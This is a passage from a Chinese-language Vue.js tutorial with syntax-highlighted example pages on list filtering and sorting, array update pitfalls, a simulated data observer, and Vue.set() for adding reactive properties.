class="string">&#x27;周杰伦&#x27;</span>,<span class="attr">age</span>:<span class="number">38</span>,<span class="attr">sex</span>:<span class="string">&#x27;男&#x27;</span>&#125;,</span></span><br><span class="line"><span class="javascript">&#123;<span class="attr">id</span>:<span class="string">&#x27;003&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;邓伦&#x27;</span>,<span class="attr">age</span>:<span class="number">28</span>,<span class="attr">sex</span>:<span class="string">&#x27;男&#x27;</span>&#125;,</span></span><br><span class="line">],</span><br><span class="line">filterPersons:[]</span><br><span class="line">&#125;,</span><br><span class="line">watch:&#123;</span><br><span class="line"><span class="javascript"><span class="comment">//监视keyWord属性是否改变</span></span></span><br><span class="line">keyWord:&#123;</span><br><span class="line"><span class="javascript">immediate:<span class="literal">true</span>,</span></span><br><span class="line"><span class="javascript"><span class="function"><span class="title">handler</span>(<span class="params">value</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="comment">//属性改变就过滤数组</span></span></span><br><span class="line"><span class="javascript"><span class="built_in">this</span>.filterPersons = <span class="built_in">this</span>.persons.filter(<span class="function">(<span class="params">p</span>)=&gt;</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="comment">//过滤name属性中包含value相同字符串的数据</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">return</span> p.name.indexOf(value) !== -<span class="number">1</span></span></span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;)*/</span><br><span class="line"><span class="javascript"><span class="comment">//#endregion</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="comment">//使用computed计算属性实现</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">data:&#123;</span><br><span class="line"><span class="javascript">keyWord:<span class="string">&#x27;&#x27;</span>,</span></span><br><span class="line">persons:[</span><br><span class="line"><span class="javascript">&#123;<span class="attr">id</span>:<span class="string">&#x27;001&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;马冬梅&#x27;</span>,<span class="attr">age</span>:<span class="number">18</span>,<span class="attr">sex</span>:<span class="string">&#x27;女&#x27;</span>&#125;,</span></span><br><span class="line"><span class="javascript">&#123;<span class="attr">id</span>:<span class="string">&#x27;002&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;周冬雨&#x27;</span>,<span class="attr">age</span>:<span class="number">28</span>,<span class="attr">sex</span>:<span class="string">&#x27;女&#x27;</span>&#125;,</span></span><br><span class="line"><span class="javascript">&#123;<span class="attr">id</span>:<span class="string">&#x27;003&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;周杰伦&#x27;</span>,<span class="attr">age</span>:<span class="number">38</span>,<span class="attr">sex</span>:<span class="string">&#x27;男&#x27;</span>&#125;,</span></span><br><span class="line"><span class="javascript">&#123;<span class="attr">id</span>:<span class="string">&#x27;003&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;邓伦&#x27;</span>,<span class="attr">age</span>:<span class="number">28</span>,<span class="attr">sex</span>:<span class="string">&#x27;男&#x27;</span>&#125;,</span></span><br><span class="line">]</span><br><span class="line">&#125;,</span><br><span class="line">computed:&#123;</span><br><span class="line"><span class="javascript"><span class="function"><span class="title">filterPersons</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">return</span> <span class="built_in">this</span>.persons.filter(<span class="function">(<span class="params">p</span>)=&gt;</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">return</span> p.name.indexOf(<span class="built_in">this</span>.keyWord) !== -<span class="number">1</span></span></span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="24-列表排序"><a href="#24-列表排序" class="headerlink" title="24.列表排序"></a>24.列表排序</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>列表排序<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--遍历数组类型数据--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>人员列表<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;请输入搜索名字&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;keyWord&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;sortType = 2&quot;</span>&gt;</span>年龄升序<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;sortType = 1&quot;</span>&gt;</span>年龄降序<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;sortType = 0&quot;</span>&gt;</span>原顺序<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(p,index) in filterPersons&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;p.id&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&#123;&#123;p.name&#125;&#125;-&#123;&#123;p.age&#125;&#125;-&#123;&#123;p.sex&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="comment">//使用computed计算属性实现</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">data:&#123;</span><br><span class="line"><span class="javascript">keyWord:<span class="string">&#x27;&#x27;</span>,</span></span><br><span class="line"><span class="javascript">sortType:<span class="number">0</span>,<span class="comment">//原顺序：0，年龄降序：1，年龄升序：2</span></span></span><br><span class="line">persons:[</span><br><span class="line"><span class="javascript">&#123;<span class="attr">id</span>:<span class="string">&#x27;001&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;马冬梅&#x27;</span>,<span class="attr">age</span>:<span class="number">18</span>,<span class="attr">sex</span>:<span class="string">&#x27;女&#x27;</span>&#125;,</span></span><br><span class="line"><span class="javascript">&#123;<span class="attr">id</span>:<span class="string">&#x27;002&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;周冬雨&#x27;</span>,<span class="attr">age</span>:<span class="number">28</span>,<span class="attr">sex</span>:<span class="string">&#x27;女&#x27;</span>&#125;,</span></span><br><span class="line"><span class="javascript">&#123;<span class="attr">id</span>:<span class="string">&#x27;003&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;周杰伦&#x27;</span>,<span class="attr">age</span>:<span class="number">48</span>,<span class="attr">sex</span>:<span class="string">&#x27;男&#x27;</span>&#125;,</span></span><br><span class="line"><span class="javascript">&#123;<span class="attr">id</span>:<span class="string">&#x27;004&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;邓伦&#x27;</span>,<span class="attr">age</span>:<span class="number">38</span>,<span class="attr">sex</span>:<span class="string">&#x27;男&#x27;</span>&#125;,</span></span><br><span class="line">]</span><br><span class="line">&#125;,</span><br><span class="line">computed:&#123;</span><br><span class="line"><span class="javascript"><span class="function"><span class="title">filterPersons</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">const</span> arr = <span class="built_in">this</span>.persons.filter(<span class="function">(<span class="params">p</span>)=&gt;</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">return</span> p.name.indexOf(<span class="built_in">this</span>.keyWord) !== -<span class="number">1</span></span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="javascript"><span class="comment">//判断是否需要排序</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//普通写法</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//#region</span></span></span><br><span class="line">/*if (this.sortType === 1) &#123;</span><br><span class="line"><span class="javascript"><span class="keyword">return</span> arr.sort(<span class="function">(<span class="params">a,b</span>)=&gt;</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">return</span> b.age-a.age</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="javascript">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.sortType === <span class="number">2</span>) &#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">return</span> arr.sort(<span class="function">(<span class="params">a,b</span>)=&gt;</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">return</span> a.age-b.age</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="javascript">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">return</span> arr</span></span><br><span class="line">&#125;*/</span><br><span class="line"><span class="javascript"><span class="comment">//#endregion</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//精简写法</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">if</span>(<span class="built_in">this</span>.sortType)&#123;</span></span><br><span class="line"><span class="javascript"><span class="comment">//数组排序</span></span></span><br><span class="line"><span class="javascript">arr.sort(<span class="function">(<span class="params">p1,p2</span>)=&gt;</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">return</span> <span class="built_in">this</span>.sortType === <span class="number">1</span> ? p2.age-p1.age : p1.age-p2.age</span></span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="keyword">return</span> arr</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="25-更新时的一个问题"><a href="#25-更新时的一个问题" class="headerlink" title="25.更新时的一个问题"></a>25.更新时的一个问题</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>更新时的一个问题<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--遍历数组类型数据--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>人员列表<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;updateMei&quot;</span>&gt;</span>更新马冬梅信息<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(p,index) in persons&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;p.id&quot;</span>&gt;</span></span><br><span class="line">&#123;&#123;p.name&#125;&#125;-&#123;&#123;p.age&#125;&#125;-&#123;&#123;p.sex&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">data:&#123;</span><br><span class="line">persons:[</span><br><span class="line"><span class="javascript">&#123;<span class="attr">id</span>:<span class="string">&#x27;001&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;马冬梅&#x27;</span>,<span class="attr">age</span>:<span class="number">18</span>,<span class="attr">sex</span>:<span class="string">&#x27;女&#x27;</span>&#125;,</span></span><br><span class="line"><span class="javascript">&#123;<span class="attr">id</span>:<span class="string">&#x27;002&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;周冬雨&#x27;</span>,<span class="attr">age</span>:<span class="number">28</span>,<span class="attr">sex</span>:<span class="string">&#x27;女&#x27;</span>&#125;,</span></span><br><span class="line"><span class="javascript">&#123;<span class="attr">id</span>:<span class="string">&#x27;003&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;周杰伦&#x27;</span>,<span class="attr">age</span>:<span class="number">48</span>,<span class="attr">sex</span>:<span class="string">&#x27;男&#x27;</span>&#125;,</span></span><br><span class="line"><span class="javascript">&#123;<span class="attr">id</span>:<span class="string">&#x27;004&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;邓伦&#x27;</span>,<span class="attr">age</span>:<span class="number">38</span>,<span class="attr">sex</span>:<span class="string">&#x27;男&#x27;</span>&#125;,</span></span><br><span class="line">]</span><br><span class="line">&#125;,</span><br><span class="line">methods: &#123;</span><br><span class="line"><span class="javascript"><span class="function"><span class="title">updateMei</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="comment">// this.persons[0].name = &#x27;马老师&#x27;//奏效</span></span></span><br><span class="line"><span class="javascript"><span class="comment">// this.persons[0].age = &#x27;50&#x27;//奏效</span></span></span><br><span class="line"><span class="javascript"><span class="comment">// this.persons[0].sex = &#x27;男&#x27;//奏效</span></span></span><br><span class="line"><span class="javascript"><span class="comment">// this.persons[0] = &#123;id:&#x27;001&#x27;,name:&#x27;马老师&#x27;,age:50,sex:&#x27;男&#x27;&#125;//不奏效</span></span></span><br><span class="line"><span class="javascript"><span class="built_in">this</span>.persons.splice(<span class="number">0</span>,<span class="number">1</span>,&#123;<span class="attr">id</span>:<span class="string">&#x27;001&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;马老师&#x27;</span>,<span class="attr">age</span>:<span class="number">50</span>,<span class="attr">sex</span>:<span class="string">&#x27;男&#x27;</span>&#125;)</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="26-模拟数据监测"><a href="#26-模拟数据监测" class="headerlink" title="26.模拟数据监测"></a>26.模拟数据监测</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>模拟数据监测<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">let</span> data = &#123;</span></span><br><span class="line"><span class="javascript">name:<span class="string">&#x27;电信学院&#x27;</span>,</span></span><br><span class="line"><span class="javascript">address:<span class="string">&#x27;北京&#x27;</span></span></span><br><span class="line">&#125;</span><br><span class="line"><span class="javascript"><span class="comment">//创建一个监视的实例对象，用于监视data中属性变化</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">const</span> obs = <span class="keyword">new</span> Observer(data)</span></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(obs)</span></span><br><span class="line"><span class="javascript"><span class="comment">//准备一个vm实例对象</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">let</span> vm = &#123;&#125;</span></span><br><span class="line">vm._data = data = obs</span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">Observer</span>(<span class="params">obj</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="comment">//汇总对象中所有属性形成一个数组</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">const</span> keys = <span class="built_in">Object</span>.keys(obj)</span></span><br><span class="line"><span class="javascript"><span class="comment">//遍历</span></span></span><br><span class="line"><span class="javascript">keys.forEach(<span class="function">(<span class="params">k</span>)=&gt;</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="built_in">Object</span>.defineProperty(<span class="built_in">this</span>,k,&#123;</span></span><br><span class="line"><span class="javascript"><span class="function"><span class="title">get</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">return</span> obj[k]</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="javascript"><span class="function"><span class="title">set</span>(<span class="params">val</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(<span class="string">&#x27;$&#123;k&#125;被改了，我要去解析模板，生成虚拟DOM，.....,我去忙了。&#x27;</span>)</span></span><br><span class="line">obj[k] = val</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="27-Vue监听数据改变原理-对象"><a href="#27-Vue监听数据改变原理-对象" class="headerlink" title="27.Vue监听数据改变原理_对象"></a>27.Vue监听数据改变原理_对象</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Vue监听数据改变原理_对象<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>学校名字：&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>学校地址：&#123;&#123;address&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="keyword">const</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">data:&#123;</span><br><span class="line"><span class="javascript">name:<span class="string">&#x27;电信学院&#x27;</span>,</span></span><br><span class="line"><span class="javascript">address:<span class="string">&#x27;北京&#x27;</span>,</span></span><br><span class="line">student:&#123;</span><br><span class="line"><span class="javascript">name:<span class="string">&#x27;小明&#x27;</span>,</span></span><br><span class="line">age:18,</span><br><span class="line"><span class="javascript">sex:<span class="string">&#x27;男&#x27;</span></span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="28-Vue-set-的使用"><a href="#28-Vue-set-的使用" class="headerlink" title="28.Vue.set()的使用"></a>28.Vue.set()的使用</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Vue.set()的使用<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>学校信息<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>学校名字：&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>学校地址：&#123;&#123;address&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>学生信息<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;addSex&quot;</span>&gt;</span>添加一个性别属性，默认值是男<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>名字：&#123;&#123;student.name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">v-if</span>=<span class="string">&quot;student.sex&quot;</span>&gt;</span>性别：&#123;&#123;student.sex&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>年龄：真实&#123;&#123;student.age.rAge&#125;&#125;,对外&#123;&#123;student.age.sAge&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>朋友们：<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(friend,index) in student.friends&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;index&quot;</span>&gt;</span></span><br><span class="line">&#123;&#123;friend.name&#125;&#125;-&#123;&#123;friend.age&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="keyword">const</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">data:&#123;</span><br><span class="line"><span class="javascript">name:<span class="string">&#x27;电信学院&#x27;</span>,</span></span><br><span class="line"><span class="javascript">address:<span class="string">&#x27;北京&#x27;</span>,</span></span><br><span class="line">student:&#123;</span><br><span class="line"><span class="javascript">name:<span class="string">&#x27;小明&#x27;</span>,</span></span><br><span class="line">age:&#123;</span><br><span class="line">rAge:32,</span><br><span class="line">sAge:20,</span><br><span class="line">&#125;,</span><br><span class="line">friends:[</span><br><span class="line"><span class="javascript">&#123;<span class="attr">name</span>:<span class="string">&#x27;Jack&#x27;</span>,<span class="attr">age</span>:<span class="number">25</span>&#125;,</span></span><br><span class="line"><span class="javascript">&#123;<span class="attr">name</span>:<span class="string">&#x27;Tom&#x27;</span>,<span class="attr">age</span>:<span class="number">28</span>&#125;,</span></span><br><span class="line">],</span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">methods: &#123;</span><br><span class="line"><span class="javascript"><span class="function"><span class="title">addSex</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="comment">// Vue.set(this.student,&#x27;sex&#x27;,&#x27;男&#x27;)</span></span></span><br><span class="line"><span class="javascript"><span class="built_in">this</span>.$set(<span class="built_in">this</span>.student,<span class="string">&#x27;sex&#x27;</span>,<span 